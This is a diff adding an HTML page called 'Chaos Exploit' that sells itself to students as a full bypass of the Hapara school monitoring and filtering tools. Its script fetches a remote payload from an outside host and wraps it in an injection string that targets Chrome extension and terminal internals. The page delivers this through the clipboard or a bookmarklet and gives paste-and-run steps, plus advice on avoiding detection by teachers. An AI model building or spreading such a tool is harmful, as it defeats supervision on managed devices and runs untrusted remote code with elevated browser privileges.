@@ -1,0 +1,132 @@
+<script type="module">
+    document.querySelector("a").onclick = (e) => e.preventDefault();
+    function copyInspect() {
+        fetch("https://xlak.github.io/chaos/bb.php")
+            .then((d) => d.text())
+            .then((d) => {
+                navigator.clipboard.writeText(
+                    'javascript:chrome://extensions\n`id=\'");chrome.terminalPrivate["@inspect#/"]`;' +
+                        d,
+                );
+                document.querySelector(".menu").style.display = "none";
+                document.querySelector(".main").style.display = "none";
+                document.querySelector(".other").style.display = "unset";
+            });
+    }
+    function copyPointblank() {
+        fetch("https://xlak.github.io/chaos/bb.php")
+            .then((d) => d.text())
+            .then((d) => {
+                document.querySelector("a").href = "javascript:`id='\")`;" + d;
+                document.querySelector(".menu").style.display = "none";
+                document.querySelector(".other2").style.display = "unset";
+            });
+    }
+    function showMenu() {
+        document.querySelector(".main").style.display = "none";
+        document.querySelector(".menu").style.display = "unset";
+    }
+    //document.querySelector('button#pointblank').onclick = copyPointblank
+    //document.querySelector('button#inspect').onclick = copyInspect
+    //document.querySelector('button#menu').onclick = showMenu
+    document.querySelector("button#menu").onclick = copyInspect;
+</script>
+
+<div class="main">
+    <h2>Chaos Exploit</h2>
+    <br />
+    <p>A full bypass method for Hapara Highlights and Hapara Filter</p>
+    <p>
+        <small>Also works on some other filters (Check github for list).</small>
+    </p>
+    <details>
+        <summary>Disclaimer</summary>
+        <small>
+            <p>
+                It is <b>your</b> decision to bypass school monitoring. I am not
+                responsible if you get in trouble for the misuse of technology
+                if you're caught using this.
+            </p>
+            <p>
+                This exploit does not bypass network-wide filters. You will
+                still need a proxy site or a VPN to unblock all websites on most
+                school networks.
+            </p>
+            <p>
+                It may be suspicious if your device shows up as offline on the
+                teacher dashboard. Use the Alphabetic Exploit instead during
+                class.
+            </p>
+        </small>
+    </details>
+    <br /><br />
+    <button id="menu">Click here to begin!</button>
+</div>
+<div
+    style="display: none"
+    class="menu">
+    <h2>Choose an Entrypoint</h2>
+    <p><small>Try the Point Blank entrypoint first.</small></p>
+    <br />
+    <div class="center_button">
+        <button id="pointblank">Run with Point Blank entrypoint</button>
+        <br /><br />
+        <button id="inspect">Run with Inspect entrypoint</button>
+    </div>
+</div>
+<div
+    style="display: none"
+    class="other">
+    <ul>
+        <li>
+            A script has been copied to your clipboard. Paste it into the URL
+            bar.
+        </li>
+        <li>Right click on the page that loads and select "Inspect".</li>
+        <li>Click on "Console" at the top and paste the script in.</li>
+        <li>When an inspect window pops up, paste the script in again.</li>
+    </ul>
+</div>
+<div
+    style="display: none"
+    class="other2">
+    <ul>
+        <li>Drag the button below into your bookmarks bar.</li>
+        <li>
+            Click the puzzle piece beside the URL bar and go to "Manage
+            Extensions".
+        </li>
+        <li>Click "Details" on any extension that you installed yourself.</li>
+        <li>Click on "View in Chrome Web Store" and then spam Escape.</li>
+        <li>If the page stays blank, click on the bookmark.</li>
+    </ul>
+    <br /><br />
+    <div class="center_button">
+        <a>Chaos</a>
+    </div>
+</div>
+<style>
+    body {
+        align-items: center;
+        justify-content: center;
+        display: flex;
+        user-select: none;
+        font-family: sans-serif;
+        background: black;
+        color: white;
+    }
+    .main,
+    .menu,
+    .center_button {
+        text-align: center;
+    }
+    a,
+    button {
+        border: 2px solid white;
+        color: white;
+        background: black;
+        font-size: larger;
+        border-radius: 40px;
+        padding: 12px;
+    }
+</style>
